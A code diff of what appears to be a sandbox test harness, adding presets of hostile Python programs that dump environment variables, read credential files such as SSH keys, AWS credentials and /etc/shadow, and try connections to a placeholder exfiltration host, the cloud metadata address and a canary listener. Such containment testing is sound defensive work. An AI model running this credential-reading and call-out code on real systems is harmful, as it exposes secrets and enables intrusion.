@@ -1,25 +1,39 @@
 // Hostile programs that go straight to the sandbox with no model involved, so the
 // walls can be tested without relying on anything the model decides.
-export const ATTACK_NETWORK_SECRETS = `import os, socket
-print("environment visible to this process:", dict(os.environ))
+const DEFAULT_TARGETS = [['exfil.example.invalid', 80], ['1.1.1.1', 443], ['169.254.169.254', 80]];
+
+const networkAttack = (targets = DEFAULT_TARGETS) => `import os, socket
+print("environment visible to this process:", dict(os.environ), flush=True)
 for path in ["/root/.aws/credentials", "/root/.ssh/id_rsa", "/etc/shadow", "/var/run/docker.sock", "/etc/padded-cell/env"]:
     try:
-        print("READ", path, open(path, "rb").read(64))
+        print("READ", path, open(path, "rb").read(64), flush=True)
     except OSError as exc:
-        print("blocked read", path, "->", exc.strerror)
-for host, port in [("exfil.example.invalid", 80), ("1.1.1.1", 443), ("169.254.169.254", 80)]:
+        print("blocked read", path, "->", exc.strerror, flush=True)
+for host, port in [${targets.map(([host, port]) => `(${JSON.stringify(host)}, ${Number(port)})`).join(', ')}]:
     try:
         socket.create_connection((host, port), timeout=2).close()
-        print("CONNECTED", host, port)
+        print("CONNECTED", host, port, flush=True)
     except OSError as exc:
-        print("blocked connect", host, port, "->", exc)
+        print("blocked connect", host, port, "->", exc, flush=True)
 `;
+
+export const ATTACK_NETWORK_SECRETS = networkAttack();
+
+/** The presets as served. The network attack also aims at the canary listener when one is running. */
+export function presetsFor(canaryTarget) {
+  if (!canaryTarget) return PRESETS;
+  // With no resolver a DNS lookup takes about 5 s here, and two would reach the 10 s wall clock. So one name at most.
+  const isName = /[a-z]/i.test(canaryTarget.host) && !canaryTarget.host.includes(':');
+  const others = isName ? DEFAULT_TARGETS.filter(([host]) => /^[\d.]+$/.test(host)) : DEFAULT_TARGETS;
+  const code = networkAttack([[canaryTarget.host, canaryTarget.port], ...others]);
+  return PRESETS.map((p) => (p.id === 'network_secrets' ? { ...p, code } : p));
+}
 
 export const PRESETS = [
   {
     id: 'network_secrets',
     title: 'Steal credentials and call out',
-    description: 'Reads credential paths and the environment, then tries DNS, a public IP and the cloud metadata address.',
+    description: 'Reads credential paths and the environment, then tries DNS, a public IP, the cloud metadata address and the canary listener.',
     code: ATTACK_NETWORK_SECRETS,
   },
   {
